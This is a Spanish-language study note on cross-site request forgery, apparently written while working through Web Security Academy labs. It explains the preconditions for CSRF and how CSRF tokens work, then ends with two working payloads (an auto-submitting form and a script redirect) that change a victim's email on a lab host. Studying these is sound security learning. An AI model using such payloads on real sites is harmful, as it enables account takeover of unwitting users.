
En un ataque CSRF exitoso, el atacante provoca que el usuario víctima realice una acción de forma involuntaria. Por ejemplo, esto puede ser para cambiar la dirección de correo electrónico de su cuenta, cambiar su contraseña o hacer una transferencia de fondos. Dependiendo de la naturaleza de la acción, el atacante podría obtener control total sobre la cuenta del usuario. Si el usuario comprometido tiene un rol privilegiado dentro de la aplicación, entonces el atacante podría tomar el control total de todos los datos y funcionalidades de la aplicación.

**Definición:** **CSRF (Cross-Site Request Forgery)** El atacante engaña al navegador de la víctima para que haga una petición a una web en la que ya está autenticada, sin que ella lo sepa. El ataque viene desde fuera pero se ejecuta con las credenciales de la víctima. Ejemplo: la víctima visita tu web maliciosa y sin saberlo le cambia el email a su cuenta bancaria.

Para que un ataque CSRF sea posible, deben existir tres condiciones clave:

- **Una acción relevante.** Hay una acción dentro de la aplicación que el atacante tiene una razón para inducir. Esto puede ser una acción privilegiada (como modificar permisos para otros usuarios) o cualquier acción sobre datos específicos del usuario (como cambiar la propia contraseña del usuario).
- **Gestión de sesiones basada en cookies.** Realizar la acción implica emitir una o más solicitudes HTTP, y la aplicación depende únicamente de las cookies de sesión para identificar al usuario que ha realizado las solicitudes. No existe ningún otro mecanismo para rastrear sesiones o validar solicitudes de usuarios.
- **Sin parámetros impredecibles de solicitudes.** Las peticiones que realizan la acción no contienen ningún parámetro cuyos valores el atacante no pueda determinar ni adivinar. Por ejemplo, al hacer que un usuario cambie su contraseña, la función no es vulnerable si un atacante necesita conocer el valor de la contraseña existente.

--- 

Un token CSRF es un valor único, secreto e impredecible que genera la aplicación del lado del servidor y se comparte con el cliente. Al emitir una solicitud para realizar una acción sensible, como enviar un formulario, el cliente debe incluir el token CSRF correcto. De lo contrario, el servidor se negará a realizar la acción solicitada.

Una forma común de compartir tokens CSRF con el cliente es incluirlos como un parámetro oculto en un formulario HTML, por ejemplo:

```
<form name="change-email-form" action="/my-account/change-email" method="POST"> <label>Email</label> <input required type="email" name="email" value="example@normal-website.com"> <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u"> <button class='button' type='submit'> Update email </button> </form>
```

Enviar este formulario da lugar a la siguiente solicitud:

```
POST /my-account/change-email HTTP/1.1 Host: normal-website.com Content-Length: 70 Content-Type: application/x-www-form-urlencoded csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

Cuando se implementan correctamente, los tokens CSRF ayudan a proteger contra ataques CSRF al dificultar que un atacante construya una solicitud válida en nombre de la víctima. Como el atacante no tiene forma de predecir el valor correcto del token CSRF, no podrá incluirlo en la solicitud maliciosa.

---

# Fallos comunes en la validación de tokens

Las vulnerabilidades CSRF suelen surgir debido a una validación defectuosa de los tokens CSRF. En esta sección, trataremos algunos de los problemas más comunes que permiten a los atacantes sortear estas defensas.

Algunas aplicaciones validan correctamente el token cuando la solicitud utiliza el método POST, pero se saltan la validación cuando se utiliza el método GET.

En esta situación, el atacante puede cambiar al método GET para eludir la validación y realizar un ataque CSRF:

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1 
Host: vulnerable-website.com 
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

--- 

```
<form method="POST" action="https://0a8f009b043b725c821c8d98004c00a2.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="otroemail@email.com">
</form>
<script>
        document.forms[0].submit();
</script>
```

```
<script>
  location = "https://TU-ID-LAB.web-security-academy.net/my-account/change-email?email=otro-email@test.com";
</script>
```

**Estos Script funcionan, el primero es de Burp y el segundo de Gemini**